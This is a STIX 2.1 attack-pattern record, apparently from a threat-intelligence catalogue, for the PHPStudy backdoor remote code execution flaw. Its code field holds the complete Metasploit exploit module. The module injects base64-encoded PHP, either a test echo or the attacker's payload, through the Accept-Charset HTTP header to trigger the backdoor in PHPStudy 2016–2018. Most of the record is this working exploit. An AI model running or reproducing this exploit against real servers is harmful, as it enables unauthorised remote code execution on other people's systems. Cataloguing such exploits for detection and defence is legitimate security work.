{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--de2a7cea-5b11-4c34-b8df-0e6133826b5d",
    "created": "2024-08-14T17:10:43.726311Z",
    "modified": "2024-08-14T17:10:43.726315Z",
    "name": "PHPStudy Backdoor Remote Code execution",
    "description": " This module can detect and exploit the backdoor of PHPStudy.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpstudy_backdoor_rce.rb",
            "external_id": "phpstudy_backdoor_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://programmer.group/using-ghidra-to-analyze-the-back-door-of-phpstudy.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PHPStudy Backdoor Remote Code execution',\n        'Description' => %q{\n          This module can detect and exploit the backdoor of PHPStudy.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Dimensional', # POC\n          'Airevan'       # Metasploit Module\n        ],\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['PHPStudy 2016-2018', {}]\n        ],\n        'References' => [\n          ['URL', 'https://programmer.group/using-ghidra-to-analyze-the-back-door-of-phpstudy.html']\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2019-09-20',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the target file on the system, usually l.php or index.php', '/l.php'])\n      ]\n    )\n  end\n\n  def check\n    uri = target_uri.path\n    fingerprint = Rex::Text.rand_text_alpha(8)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri),\n      'headers' => {\n        'Accept-Encoding' => 'gzip,deflate',\n        'Accept-Charset' => Rex::Text.encode_base64(\"echo '#{fingerprint}';\")\n      }\n    })\n\n    if res && res.code == 200 && res.body.to_s.include?(fingerprint)\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    uri = target_uri.path\n    print_good('Sending shellcode')\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri),\n      'headers' => {\n        'Accept-Encoding' => 'gzip,deflate',\n        'Accept-Charset' => Rex::Text.encode_base64(payload.encoded)\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-09-20",
    "x_mitre_platforms": [
        "['php']"
    ]
}